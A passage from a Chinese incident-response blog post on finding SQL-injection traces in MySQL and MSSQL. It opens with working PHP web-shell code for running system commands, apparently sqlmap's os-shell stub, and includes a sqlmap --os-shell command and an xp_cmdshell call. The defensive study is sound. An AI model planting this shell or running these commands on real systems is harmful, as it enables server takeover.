+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$z</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">@</span><span style="color:#58a1dd">ini_get</span>(<span style="color:#a6be9d">&#39;disable_functions&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#ff636f">!</span><span style="color:#ff636f">empty</span>(<span style="color:#58a1dd">$z</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$z</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">preg_replace</span>(<span style="color:#a6be9d">&#39;/[, ]+/&#39;</span>, <span style="color:#a6be9d">&#39;,&#39;</span>, <span style="color:#58a1dd">$z</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$z</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">explode</span>(<span style="color:#a6be9d">&#39;,&#39;</span>, <span style="color:#58a1dd">$z</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$z</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">array_map</span>(<span style="color:#a6be9d">&#39;trim&#39;</span>, <span style="color:#58a1dd">$z</span>);
+</span></span><span style="display:flex;"><span>} <span style="color:#ff636f">else</span> { 
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$z</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">array</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$c</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$c</span> <span style="color:#ff636f">.</span> <span style="color:#a6be9d">&#34; 2&gt;&amp;1</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">f</span>(<span style="color:#58a1dd">$n</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">global</span> <span style="color:#58a1dd">$z</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">is_callable</span>(<span style="color:#58a1dd">$n</span>) <span style="color:#ff636f">and</span> <span style="color:#ff636f">!</span><span style="color:#58a1dd">in_array</span>(<span style="color:#58a1dd">$n</span>, <span style="color:#58a1dd">$z</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#58a1dd">f</span>(<span style="color:#a6be9d">&#39;system&#39;</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">ob_start</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">system</span>(<span style="color:#58a1dd">$c</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$w</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">ob_get_contents</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">ob_end_clean</span>();
+</span></span><span style="display:flex;"><span>} <span style="color:#ff636f">elseif</span> (<span style="color:#58a1dd">f</span>(<span style="color:#a6be9d">&#39;proc_open&#39;</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$y</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">proc_open</span>(<span style="color:#58a1dd">$c</span>, <span style="color:#ff636f">array</span>(<span style="color:#ff636f">array</span>(<span style="color:#58a1dd">pipe</span>, <span style="color:#a6be9d">&#39;r&#39;</span>), <span style="color:#ff636f">array</span>(<span style="color:#58a1dd">pipe</span>, <span style="color:#a6be9d">&#39;w&#39;</span>), <span style="color:#ff636f">array</span>(<span style="color:#58a1dd">pipe</span>, <span style="color:#a6be9d">&#39;w&#39;</span>)), <span style="color:#58a1dd">$t</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$w</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">while</span> (<span style="color:#ff636f">!</span><span style="color:#58a1dd">feof</span>(<span style="color:#58a1dd">$t</span>[<span style="color:#a6be9d">1</span>])) {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$w</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">fread</span>(<span style="color:#58a1dd">$t</span>[<span style="color:#a6be9d">1</span>], <span style="color:#a6be9d">512</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">@</span><span style="color:#58a1dd">proc_close</span>(<span style="color:#58a1dd">$y</span>);
+</span></span><span style="display:flex;"><span>} <span style="color:#ff636f">elseif</span> (<span style="color:#58a1dd">f</span>(<span style="color:#a6be9d">&#39;shell_exec&#39;</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$w</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">shell_exec</span>(<span style="color:#58a1dd">$c</span>);
+</span></span><span style="display:flex;"><span>} <span style="color:#ff636f">elseif</span> (<span style="color:#58a1dd">f</span>(<span style="color:#a6be9d">&#39;passthru&#39;</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">ob_start</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">passthru</span>(<span style="color:#58a1dd">$c</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$w</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">ob_get_contents</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">ob_end_clean</span>();
+</span></span><span style="display:flex;"><span>} <span style="color:#ff636f">elseif</span> (<span style="color:#58a1dd">f</span>(<span style="color:#a6be9d">&#39;popen&#39;</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$x</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">popen</span>(<span style="color:#58a1dd">$c</span>, <span style="color:#a6be9d">&#39;r&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$w</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">is_resource</span>(<span style="color:#58a1dd">$x</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">while</span> (<span style="color:#ff636f">!</span><span style="color:#58a1dd">feof</span>(<span style="color:#58a1dd">$x</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">$w</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">fread</span>(<span style="color:#58a1dd">$x</span>, <span style="color:#a6be9d">512</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">@</span><span style="color:#58a1dd">pclose</span>(<span style="color:#58a1dd">$x</span>);
+</span></span><span style="display:flex;"><span>} <span style="color:#ff636f">elseif</span> (<span style="color:#58a1dd">f</span>(<span style="color:#a6be9d">&#39;exec&#39;</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$w</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">array</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">exec</span>(<span style="color:#58a1dd">$c</span>, <span style="color:#58a1dd">$w</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$w</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">join</span>(<span style="color:#58a1dd">chr</span>(<span style="color:#a6be9d">10</span>), <span style="color:#58a1dd">$w</span>) <span style="color:#ff636f">.</span> <span style="color:#58a1dd">chr</span>(<span style="color:#a6be9d">10</span>);
+</span></span><span style="display:flex;"><span>} <span style="color:#ff636f">else</span> { 
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$w</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">print</span> <span style="color:#a6be9d">&#34;&#34;</span> <span style="color:#ff636f">.</span> <span style="color:#58a1dd">$w</span> <span style="color:#ff636f">.</span> <span style="color:#a6be9d">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
+</span></span></code></pre></div><p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p>
+<p>通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。</p>
+<p>检查方法：</p>
+<p>1、检查网站目录下，是否存在一些木马文件：</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191526034.webp" alt="image-20240719152625840" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191526034.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191526034.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191526034.webp?size=large 2x" data-title="image-20240719152625840" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>2、检查是否有UDF提权、MOF提权痕迹</p>
+<p>检查目录是否有异常文件</p>
+<p>mysql\lib\plugin</p>
+<p>c:/windows/system32/wbem/mof/</p>
+<p>检查函数是否删除</p>
+<pre tabindex="0"><code>select * from mysql.func</code></pre><p>3、结合web日志分析。</p>
+<h6 id="sqlserver" class="heading-element"><span>0.0.0.3.2  Sqlserver</span>
+  <a href="#sqlserver" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p>
+<p>####### 0x01 MSSQL日志分析</p>
+<p>首先，MSSQL数据库应启用日志记录功能，默认配置仅限失败的登录，需修改为失败和成功的登录，这样就可以对用户登录进行审核。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191559139.webp" alt="image-20240719155923969" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191559139.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191559139.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191559139.webp?size=large 2x" data-title="image-20240719155923969" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>登录到SQL Server Management Studio，依次点击 管理&ndash;SQL Server 日志</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191559899.webp" alt="image-20240719155936729" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191559899.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191559899.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191559899.webp?size=large 2x" data-title="image-20240719155936729" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>双击日志存档文件即可打开日志文件查看器，并可以对日志进行筛选或者导出等操作。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191559801.webp" alt="image-20240719155949605" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191559801.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191559801.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191559801.webp?size=large 2x" data-title="image-20240719155949605" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>另外，MSSQ提供了一个工具SQL Server Profiler ，方便查找和发现SQL执行的效率和语句问题。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191600526.webp" alt="image-20240719160003364" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191600526.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191600526.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191600526.webp?size=large 2x" data-title="image-20240719160003364" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>日志分析案例：</p>
+<p>在日志文件查看器中，选择筛选，在筛选设置中源设置为“登录”，应用筛选器，确定。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191600503.webp" alt="image-20240719160015313" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191600503.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191600503.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191600503.webp?size=large 2x" data-title="image-20240719160015313" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>筛选后的结果，可以很清晰的识别用户登录信息，记录内容包括用户登录时间、登录是否成功、登录使用的账号以及远程登录时用户使用的IP地址。</p>
+<p>如下图：客户端：192.168.204.1进行尝试弱口令登录，并发现其中有一条登录成功的记录。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191600435.webp" alt="image-20240719160027220" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191600435.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191600435.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191600435.webp?size=large 2x" data-title="image-20240719160027220" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>####### 0x02 SQL注入入侵痕迹</p>
+<p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的&ndash;os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p>
+<p>1、构造一个SQL注入点，开启Burp监听8080端口</p>
+<pre tabindex="0"><code>sqlmap.py -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></pre><p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p>
+<p>通过查看数据库中最近新建的表的结构和内容，可以判断是否发生过sql注入漏洞攻击事件。</p>
+<p>检查方法：</p>
+<p>1、数据库表检查</p>
+<p>2、检查xp_cmdshell等存储过程</p>
+<p>xp_cmdshell在mssql2005之后的版本中是默认禁止的，查看xp_cmdshell是否被启用。</p>
+<p>`Exec master.dbo.xp_cmdshell &lsquo;whoami&rsquo;</p>
+<p>3、需要结合web日志，通过查看日志文件的大小以及审计日志文件中的内容，可以判断是否发生过sql注入漏洞攻击事件。</p>
+<h6 id="redis" class="heading-element"><span>0.0.0.3.3  redis</span>
+  <a href="#redis" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%94%BB%E9%98%B2/" class="post-tag" title="Tags - 攻防">攻防</a><a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="post-tag" title="Tags - 应急响应">应急响应</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/owasp/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/114/" class="post-nav-item" rel="prev" title="文件上传-Bypass"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>文件上传-Bypass</a>
+      <a href="/posts/%E6%94%BB%E9%98%B2/%E9%98%B2%E5%AE%88/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/38/" class="post-nav-item" rel="next" title="应急响应-入侵排查">应急响应-入侵排查<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
